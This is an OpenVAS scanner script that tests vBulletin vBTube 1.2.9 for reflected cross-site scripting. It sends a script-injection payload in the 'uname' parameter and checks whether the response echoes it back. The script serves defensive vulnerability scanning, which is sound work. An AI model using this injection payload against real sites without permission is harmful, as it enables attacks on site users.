###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vbulletin_vbtube_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# vBulletin vBTube Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.
  Impact Level: Application";
tag_affected = "vBulletin vBTube version 1.2.9";
tag_insight = "Multiple flaws are caused by improper validation of user-supplied input
  passed via 'uname' and 'vidid'  parameters in vBTube.php, which allows
  attackers to execute arbitrary HTML and script code on the web server.";
tag_solution = "No solution or patch is available as of 16th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.vbulletin.org/forum/showthread.php?t=173083";
tag_summary = "This host is running vBulletin vBTube and is prone to multiple
  cross site scripting vulnerabilities.";

if(description)
{
  script_id(802209);
  script_version("$Revision: 13 $");
  script_bugtraq_id(48280);
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-17 11:16:31 +0200 (Fri, 17 Jun 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("vBulletin vBTube Multiple Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/68060");
  script_xref(name : "URL" , value : "http://www.vbulletin.org/forum/showthread.php?t=173083");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102238/vbtube129-xss.txt");

  script_description(desc);
  script_summary("Check if vBulletin vBTube is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("vbulletin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("vBulletin/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get vBulletin Location
if(! dir = get_dir_from_kb(port:port, app:"vBulletin")){
  exit(0);
}

## Construct attack request
url = string(dir, '/vBTube.php?page=1&do=user&uname="><script>alert(/openvas',
                  '-xss-test/);</script>');

## Try XSS and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header: TRUE,
   pattern:"><script>alert\(/openvas-xss-test/\);</script>")){
  security_warning(port);
}
